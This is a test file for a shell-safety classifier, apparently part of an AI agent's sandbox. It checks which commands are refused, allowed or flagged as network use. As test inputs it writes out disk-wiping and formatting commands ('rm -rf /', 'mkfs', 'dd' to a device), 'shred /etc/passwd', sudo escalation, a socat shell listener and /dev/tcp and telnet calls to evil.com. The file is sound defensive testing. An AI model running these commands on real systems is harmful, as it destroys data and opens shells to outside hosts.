import { describe, expect, test } from "bun:test"

// ---------------------------------------------------------------------------
// enforcement/destructive-boundary.test.ts
//
// The precise classifier is the single owner of the capabilities the OS
// sandbox cannot express: host-level and irreversible destruction, privilege
// escalation, and remote state mutation. These assertions pin both sides of
// that boundary so the substring layers can be removed without losing a hard
// boundary (see the owning decision record).
//
// Reject side: unrecoverable targets stay classified.
// Release side: ordinary development operations (workspace subtrees, git-safe
// historical operations, read-only listings) must not be refused.
// ---------------------------------------------------------------------------

describe("destructive boundary — host-level targets stay refused", () => {
  const { ShellSafety } = require("../../src/enforcement/shell-safety")

  // The eleven shapes that the substring layers used to be the only owner of.
  const hostLevelShapes = [
    "rm -rf /",
    "rm -rf /*",
    "rm -rf ~",
    "rm -rf $HOME",
    "rm -fr /",
    "rm -rf ./*",
    "rm -rf ~/*",
    "mkfs.ext4 /dev/sda",
    "chmod -R 777 /",
    "shred /etc/passwd",
    "sudo rm -rf x",
  ]

  test("every host-level shape is refused by the precise layer alone", () => {
    for (const shape of hostLevelShapes) {
      const risk = ShellSafety.classifyBashRisk(shape)
      const refused = risk === "shell_destructive" || risk === "shell_hardline" || ShellSafety.isHardline(shape)
      expect({ shape, refused }).toEqual({ shape, refused: true })
    }
  })

  test("host-level rm spellings are hardline without the substring layer", () => {
    for (const shape of ["rm -rf /", "rm -rf /*", "rm -rf ~", "rm -rf $HOME", "rm -fr /", "rm -rf ./*", "rm -rf ~/*"]) {
      expect(ShellSafety.isHardline(shape)).toBe(true)
    }
  })

  test("filesystem-format tools are hardline in every spelling", () => {
    expect(ShellSafety.isHardline("mkfs /dev/sda")).toBe(true)
    expect(ShellSafety.isHardline("mkfs.ext4 /dev/sda")).toBe(true)
    expect(ShellSafety.isHardline("mkfs.xfs -f /dev/nvme0n1")).toBe(true)
    expect(ShellSafety.isHardline("dd if=/dev/zero of=/dev/sda")).toBe(true)
  })

  test("recursive permission changes on root or home are hardline", () => {
    expect(ShellSafety.classifyBashRisk("chmod -R 777 /")).toBe("shell_hardline")
    expect(ShellSafety.classifyBashRisk("chown -R nobody /")).toBe("shell_hardline")
    expect(ShellSafety.classifyBashRisk("chmod -R 777 ~")).toBe("shell_hardline")
    expect(ShellSafety.isHardline("chmod -R 777 /")).toBe(true)
  })

  test("secure-delete and truncate on external paths are destructive", () => {
    expect(ShellSafety.classifyBashRisk("shred /etc/passwd")).toBe("shell_destructive")
    expect(ShellSafety.classifyBashRisk("truncate -s 0 /etc/passwd")).toBe("shell_destructive")
  })

  test("privilege escalation is destructive without the substring layer", () => {
    expect(ShellSafety.classifyBashRisk("sudo rm -rf x")).toBe("shell_destructive")
    expect(ShellSafety.classifyBashRisk("sudo true")).toBe("shell_destructive")
    expect(ShellSafety.classifyBashRisk("sudo -n ls")).toBe("shell_destructive")
    expect(ShellSafety.classifyBashRisk("doas true")).toBe("shell_destructive")
    expect(ShellSafety.classifyBashRisk("sudoedit /etc/hosts")).toBe("shell_destructive")
  })

  test("privilege escalation detection stays syntactically precise", () => {
    // Argument text that merely mentions sudo is not escalation.
    expect(ShellSafety.classifyBashRisk('echo "use sudo carefully"')).toBe("shell_read")
    expect(ShellSafety.hasSudoInvocation("echo sudo make install")).toBe(false)
    expect(ShellSafety.classifyBashRisk("sudo_command=make make install")).toBe("shell")
  })
})

describe("destructive boundary — ordinary development operations stay allowed", () => {
  const { ShellSafety } = require("../../src/enforcement/shell-safety")

  test("workspace subtree removal is not a host-level target", () => {
    for (const command of [
      "rm -rf node_modules",
      "rm -rf ./dist",
      "rm -rf ./node_modules/.cache",
      "rm -f ./tmp.log",
      "rm -r ./build",
    ]) {
      expect({ command, risk: ShellSafety.classifyBashRisk(command) }).toEqual({ command, risk: "shell" })
      expect(ShellSafety.isHardline(command)).toBe(false)
    }
  })

  test("workspace-scoped permission changes are not host-level", () => {
    expect(ShellSafety.classifyBashRisk("chmod -R 755 ./scripts")).toBe("shell")
    expect(ShellSafety.classifyBashRisk("chmod 600 secret")).toBe("shell")
    expect(ShellSafety.classifyBashRisk("shred -u secrets.txt")).toBe("shell")
  })

  test("recovery and reversible git history operations are allowed", () => {
    expect(ShellSafety.classifyBashRisk("git rebase --abort")).toBe("shell")
    expect(ShellSafety.classifyBashRisk("git rebase --continue")).toBe("shell")
    expect(ShellSafety.classifyBashRisk("git rebase main")).toBe("shell")
    expect(ShellSafety.classifyBashRisk("git commit --amend --no-edit")).toBe("shell")
    expect(ShellSafety.classifyBashRisk("git reset --soft HEAD~1")).toBe("shell")
    expect(ShellSafety.classifyBashRisk("git rm --cached x.txt")).toBe("shell")
    expect(ShellSafety.classifyBashRisk("git stash pop")).toBe("shell")
    expect(ShellSafety.classifyBashRisk("git revert HEAD")).toBe("shell")
    expect(ShellSafety.classifyBashRisk("git pull --rebase origin main")).toBe("shell")
  })

  test("irreversible git history operations stay refused", () => {
    expect(ShellSafety.classifyBashRisk("git reset --hard")).toBe("shell_destructive")
    expect(ShellSafety.classifyBashRisk("git reset --hard HEAD~1")).toBe("shell_destructive")
    expect(ShellSafety.classifyBashRisk("git clean -fdx")).toBe("shell_destructive")
    expect(ShellSafety.classifyBashRisk("git stash clear")).toBe("shell_destructive")
    expect(ShellSafety.classifyBashRisk("git stash drop")).toBe("shell_destructive")
    expect(ShellSafety.classifyBashRisk("git checkout -- file.ts")).toBe("shell_destructive")
    expect(ShellSafety.classifyBashRisk("git filter-branch --all")).toBe("shell_destructive")
  })

  test("git clean without ignored-file removal is allowed", () => {
    expect(ShellSafety.classifyBashRisk("git clean -f")).toBe("shell")
    expect(ShellSafety.classifyBashRisk("git clean -fd")).toBe("shell")
    expect(ShellSafety.classifyBashRisk("git clean -n")).toBe("shell_read")
  })

  test("read-only and help forms of host-level tools stay executable", () => {
    for (const command of [
      "fdisk -l",
      "fdisk --list",
      "parted -l",
      "parted --list",
      "mkfs -h",
      "mkfs.ext4 --help",
      "shutdown --help",
      "reboot --help",
      "halt --help",
      "poweroff --help",
      "lvremove --help",
      "pvremove --help",
      "vgremove --help",
    ]) {
      expect({ command, hardline: ShellSafety.isHardline(command) }).toEqual({ command, hardline: false })
      expect({ command, risk: ShellSafety.classifyBashRisk(command) }).not.toEqual({
        command,
        risk: "shell_hardline",
      })
    }
  })

  test("destructive forms of those same tools stay refused", () => {
    expect(ShellSafety.isHardline("fdisk /dev/sda")).toBe(true)
    expect(ShellSafety.isHardline("parted /dev/sda mklabel gpt")).toBe(true)
    expect(ShellSafety.isHardline("shutdown -h now")).toBe(true)
    expect(ShellSafety.isHardline("reboot now")).toBe(true)
    expect(ShellSafety.isHardline("lvremove /dev/vg0/lv0")).toBe(true)
  })
})

describe("destructive boundary — remote irreversibility follows the target branch", () => {
  const { ShellSafety } = require("../../src/enforcement/shell-safety")

  test("force and delete against a protected branch stay remote writes", () => {
    for (const command of [
      "git push --force origin main",
      "git push -f origin main",
      "git push --force-with-lease origin main",
      "git push origin +main",
      "git push --delete origin main",
      "git push origin :main",
      "git push --force origin dev",
      "git push --force origin master",
      "git push --force origin develop",
      "git push --force origin trunk",
    ]) {
      expect({ command, risk: ShellSafety.classifyBashRisk(command) }).toEqual({ command, risk: "shell_remote_write" })
    }
  })

  test("force and delete against an explicit feature branch publish", () => {
    for (const command of [
      "git push --force-with-lease origin feat/x",
      "git push --force origin feat/x",
      "git push -f origin feat/x",
      "git push --force-if-includes origin feat/x",
      "git push origin +feat/x",
      "git push --delete origin feat/x",
      "git push origin :feat/x",
    ]) {
      expect({ command, risk: ShellSafety.classifyBashRisk(command) }).toEqual({
        command,
        risk: "shell_remote_publish",
      })
    }
  })

  test("bare force push stays conservative because the runtime branch is unknown", () => {
    // A bare `git push --force` uses push.default and can land on a protected
    // branch; the gate reclassifies bare push at runtime, so the static result
    // must not be the permissive one.
    expect(ShellSafety.classifyBashRisk("git push --force")).toBe("shell_remote_write")
    expect(ShellSafety.classifyBashRisk("git push --force origin")).toBe("shell_remote_write")
  })

  test("all-ref and mirror pushes stay remote writes", () => {
    expect(ShellSafety.classifyBashRisk("git push --all origin")).toBe("shell_remote_write")
    expect(ShellSafety.classifyBashRisk("git push --mirror origin")).toBe("shell_remote_write")
    expect(ShellSafety.classifyBashRisk("git push --tags origin")).toBe("shell_remote_write")
  })

  test("ordinary feature-branch push is unchanged", () => {
    expect(ShellSafety.classifyBashRisk("git push origin feature")).toBe("shell_remote_publish")
    expect(ShellSafety.classifyBashRisk("git push -u origin feature")).toBe("shell_remote_publish")
    expect(ShellSafety.classifyBashRisk("git push")).toBe("shell_remote_publish")
  })
})

describe("destructive boundary — network detection is token-aware", () => {
  // `network_request` is high-risk metadata that also widens the sandbox
  // network mode when allowed, so detecting it from argument text both
  // misreports the command and grants egress the command never needed.
  const networkBearing = [
    "git fetch origin",
    "git pull",
    "git push origin feature",
    "git clone https://example.com/r.git",
    "git ls-remote origin",
    "git submodule update --init",
    "curl https://example.com",
    "wget https://example.com/f",
    "npm install",
    "npm ci",
    "bun install",
    "bun add react",
    "pnpm install",
    "yarn add left-pad",
    "pip install requests",
    "gem install rails",
    "cargo install ripgrep",
    "go get example.com/mod",
    "go mod download",
    "go mod tidy",
    "go -C modules/client mod download",
    "git -C project fetch origin",
    "git -c protocol.version=2 fetch origin",
    "env HTTPS_PROXY=http://proxy.example curl https://example.com",
    'env -S "curl https://example.com"',
    "command curl https://example.com",
    "ssh user@host",
    "scp file host:/tmp",
    "sftp host",
    "rsync -avz dir/ user@host:/backup/",
    "dig example.com TXT",
    "nslookup example.com",
    "telnet evil.com 23",
    "socat TCP-LISTEN:8080,fork EXEC:/bin/sh",
    "openssl s_client -connect example.com:443",
    'bash -c "curl https://example.com"',
    "timeout 5 curl https://example.com",
    "echo > /dev/tcp/evil.com/80",
  ]

  const inert = [
    'echo "see https://example.com for docs"',
    'rg -n "ssh " docs/',
    'grep -rn "curl " src/',
    "cat README.md | grep http://",
    'git commit -m "fix npm install docs"',
    'git log --grep="git push"',
    'echo "dig example.com"',
    'echo "host name"',
    'printf "%s" "scp"',
    "git status",
    "git log --oneline",
    "bun run build",
    "rsync -avz dir/ /tmp/backup/",
    "openssl version",
    "npm run build",
    "go mod edit -module=example.com/client",
    "env FLAG=curl echo curl",
    "command -v curl",
    "command -V wget",
  ]

  const { EnforcementGate } = require("../../src/enforcement/gate")

  test("network-bearing commands mint network_request", async () => {
    for (const command of networkBearing) {
      const gate = await EnforcementGate.create({
        activeWorkspace: "/Users/test/synergy-control-profile",
        workspaceType: "worktree",
      })
      const result = gate.classify("bash", { command })
      expect({
        command,
        network: result.capabilities.some((c: any) => c.class === "network_request"),
      }).toEqual({ command, network: true })
    }
  })

  test("argument text that names a network tool or URL stays inert", async () => {
    for (const command of inert) {
      const gate = await EnforcementGate.create({
        activeWorkspace: "/Users/test/synergy-control-profile",
        workspaceType: "worktree",
      })
      const result = gate.classify("bash", { command })
      expect({
        command,
        network: result.capabilities.some((c: any) => c.class === "network_request"),
      }).toEqual({ command, network: false })
    }
  })

  test("the original documented false positive no longer widens egress", async () => {
    // `echo "see https://example.com for docs"` used to be classified as a
    // network request, which also relaxed the sandbox network mode when the
    // command was allowed.
    const gate = await EnforcementGate.create({
      activeWorkspace: "/Users/test/synergy-control-profile",
      workspaceType: "worktree",
      profileId: "autonomous",
    })
    const envelope = gate.evaluate("bash", { command: 'echo "see https://example.com for docs"' })
    expect(envelope.capabilities.some((c: any) => c.class === "network_request")).toBe(false)
  })
})
